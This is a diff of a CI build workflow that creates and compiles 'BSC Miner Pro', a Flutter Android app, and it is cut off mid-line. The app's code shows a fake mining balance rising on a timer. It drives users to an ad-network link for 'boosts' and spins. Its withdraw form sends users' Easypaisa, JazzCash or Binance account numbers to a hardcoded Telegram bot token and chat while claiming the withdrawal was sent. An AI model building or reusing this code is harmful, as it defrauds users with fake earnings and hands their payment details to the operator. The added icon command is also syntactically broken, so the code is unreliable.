@@ -6,16 +6,16 @@ workflows:
     environment:
       flutter: stable
     scripts:
-      - name: FINAL PRO BUILD
+      - name: VIBE PRO BUILD V3
         script: |
           set -e
           flutter create --platforms=android --org com.bscminer.app . --overwrite
           pip3 install pillow -q
           mkdir -p assets
-          python3 -c "from PIL import Image, ImageDraw; img=Image.new('RGB',(1024,1024),'#F3BA2F'); d=ImageDraw.Draw(img); d.rounded_rectangle([140,140,884,884],radius=220,fill='#0B0E11'); d.rounded_rectangle([340,340,684,684],radius=90,fill='#F3BA2F'); d.ellipse([450,450,574,574],fill='#0B0E11'); img.save('assets/icon.png')"
+          python3 -c "from PIL import Image, ImageDraw; img=Image.new('RGB',(1024,1024),'#0B0E11'); d=ImageDraw.Draw(img); d.ellipse([60,60,964,964],fill:'#F3BA2F'); d.ellipse([140,140,884,884],fill:'#0B0E11'); d.ellipse([320,320,704,704],fill:'#F3BA2F'); img.save('assets/icon.png')"
           cat > pubspec.yaml << 'YAML'
           name: bsc_miner_pro
-          version: 2.0.0+10
+          version: 3.0.0+11
           publish_to: none
           environment:
             sdk: ">=3.0.0 <4.0.0"
@@ -32,23 +32,13 @@ workflows:
           YAML
           mkdir -p lib
           cat > lib/main.dart << 'DART'
-          import 'dart:async';import 'dart:math';import 'package:flutter/material.dart';import 'package:url_launcher/url_launcher.dart';import 'package:share_plus/share_plus.dart';import 'package:http/http.dart' as http;
-          void main()=>runApp(BscApp());
-          class BscApp extends StatelessWidget{@override Widget build(BuildContext c)=>MaterialApp(debugShowCheckedModeBanner:false,theme:ThemeData.dark(),home:Home());}
-          class Home extends StatefulWidget{@override State<Home> createState()=>_HomeState();}
-          class _HomeState extends State<Home> with TickerProviderStateMixin{
-          double balance=0.0054073;double hashrate=12.82;int spinsLeft=5;bool isMining=true;late AnimationController _pulse;
-          final String botToken='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final String chatId='8296278042';
-          @override void initState(){super.initState();_pulse=AnimationController(vsync:this,duration:Duration(seconds:2))..repeat(reverse:true);Timer.periodic(Duration(milliseconds:100),(t){if(isMining&&mounted)setState((){balance+=0.00000018;hashrate=10+Random().nextDouble()*5;});});}
-          Future<void> watchAd({double r=0.00015})async{final u=Uri.parse('https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f');try{await launchUrl(u,mode:LaunchMode.externalApplication);}catch(e){await launchUrl(u,mode:LaunchMode.inAppBrowserView);}if(mounted)setState((){balance+=r;spinsLeft++;isMining=true;});}
-          Future<void> sendTG(String m,String a)async{var url=Uri.parse("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=WITHDRAW%20Amount:%20\$${balance.toStringAsFixed(5)}%20Method:$m%20Acc:$a");await http.get(url);if(mounted)ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Withdraw Sent!')));}
-          void spin(){if(spinsLeft<=0){ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Watch Ad for Spin')));return;}double win=[0.0002,0.0005,0.001,0.002][Random().nextInt(4)];setState((){balance+=win;spinsLeft--;});showDialog(context:context,builder:(_)=>AlertDialog(backgroundColor:Color(0xFF181A20),title:Center(child:Text('YOU WON \$${win.toStringAsFixed(5)}',style:TextStyle(color:Color(0xFFF3BA2F),fontWeight:FontWeight.bold))),actions:[TextButton(onPressed:(){Navigator.pop(context);watchAd(r:0);},child:Text('CLAIM X2'))]));}
-          void withdrawSheet(){TextEditingController c=TextEditingController();String m='Easypaisa';showModalBottomSheet(context:context,isScrollControlled:true,backgroundColor:Color(0xFF181A20),shape:RoundedRectangleBorder(borderRadius:BorderRadius.vertical(top:Radius.circular(25))),builder:(ctx)=>StatefulBuilder(builder:(ctx,setS)=>Padding(padding:EdgeInsets.fromLTRB(20,20,20,MediaQuery.of(ctx).viewInsets.bottom+20),child:Column(mainAxisSize:MainAxisSize.min,children:[Text('Withdraw',style:TextStyle(fontSize:20,fontWeight:FontWeight.bold)),SizedBox(height:15),DropdownButtonFormField(value:m,dropdownColor:Color(0xFF1E232F),items:['Easypaisa','JazzCash','Binance'].map((e)=>DropdownMenuItem(value:e,child:Text(e))).toList(),onChanged:(v)=>setS(()=>m=v!)),SizedBox(height:10),TextField(controller:c,decoration:InputDecoration(hintText:'Account Number')),SizedBox(height:15),SizedBox(width:double.infinity,child:ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Color(0xFFF3BA2F)),onPressed:()async{await sendTG(m,c.text);Navigator.pop(ctx);},child:Text('CONFIRM',style:TextStyle(color:Colors.black))))]))));}
-          @override Widget build(BuildContext context){return Scaffold(backgroundColor:Color(0xFF0B0E11),appBar:AppBar(backgroundColor:Color(0xFF0B0E11),title:Text('BSC MINER',style:TextStyle(fontWeight:FontWeight.w900))),body:SingleChildScrollView(padding:EdgeInsets.all(16),child:Column(children:[Container(padding:EdgeInsets.all(20),decoration:BoxDecoration(color:Color(0xFF1E232F),borderRadius:BorderRadius.circular(24)),child:Column(children:[Text('MINING ${hashrate.toStringAsFixed(2)} GH/s',style:TextStyle(color:Color(0xFFF3BA2F))),SizedBox(height:10),Text('\$${balance.toStringAsFixed(7)}',style:TextStyle(fontSize:36,fontWeight:FontWeight.w900)),SizedBox(height:15),Row(children:[Expanded(child:ElevatedButton(onPressed:()=>setState(()=>isMining=!isMining),child:Text(isMining?'PAUSE':'START'))),SizedBox(width:10),Expanded(child:ElevatedButton(style:ElevatedButton.styleFrom(backgroundColor:Color(0xFFF3BA2F)),onPressed:()=>watchAd(),child:Text('BOOST +$spinsLeft',style:TextStyle(color:Colors.black))))])])),SizedBox(height:16),Row(children:[Expanded(child:InkWell(onTap:spin,child:Container(height:100,color:Colors.white10,child:Center(child:Text('SPIN'))))),SizedBox(width:10),Expanded(child:InkWell(onTap:withdrawSheet,child:Container(height:100,color:Colors.white10,child:Center(child:Text('WITHDRAW')))))])])));}
-          }
-          DART
-          flutter pub get
-          for d in mipmap-xxxhdpi mipmap-xxhdpi mipmap-xhdpi mipmap-hdpi; do mkdir -p android/app/src/main/res/$d; cp assets/icon.png android/app/src/main/res/$d/ic_launcher.png; done
-          flutter build apk --release --split-per-abi --no-tree-shake-icons
-    artifacts:
-      - build/app/outputs/flutter-apk/*.apk
+          import 'dart:async';import 'dart:math';import 'package:flutter/material.dart';import 'package:url_launcher/url_launcher.dart';import 'package:http/http.dart' as http;
+          void main()=>runApp(MaterialApp(debugShowCheckedModeBanner:false,theme:ThemeData.dark().copyWith(scaffoldBackgroundColor:Color(0xFF0B0E11)),home:Pro()));
+          class Pro extends StatefulWidget{@override State<Pro> createState()=>_ProState();}
+          class _ProState extends State<Pro> with TickerProviderStateMixin{
+          double bal=0.0054073;int spins=5;bool mining=true;late AnimationController pulse;
+          final bot='8905610310:AAGH4yneCTPSbHq2bJfZl-ArruZ6OJa-LzY';final chat='8296278042';
+          @override void initState(){super.initState();pulse=AnimationController(vsync:this,duration:Duration(milliseconds:900))..repeat(reverse:true);Timer.periodic(Duration(milliseconds:90),(t){if(mining) setState(()=>bal+=0.00000021);});}
+          Future<void> boost()=>launchAd(0.00018);
+          Future<void> launchAd(double r)async{final u=Uri.parse('https://www.effectivecpmnetwork.com/vm70uh6qxb?key=30472d3647946c4a2a73f4ef7660c55f');await launchUrl(u,mode:LaunchMode.externalApplication);setState(()=>{bal+=r,spins++,mining=true});}
+          void spin(){if(spins<=0){ScaffoldMessenger.of(context).showSnackBar(SnackBar(content:Text('Watch Ad For Spin!')));return;}double w=[0.0003,0.0007,0.0012,0.0025][Random().nextInt(4)];setState(()=>{bal+=w,spins--});showDialog(context:context,builder:(_)=>Dialog(backgroundColor:Color(0xFF1E2329),shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(20)),child:Padding(padding:EdgeInsets.all(24
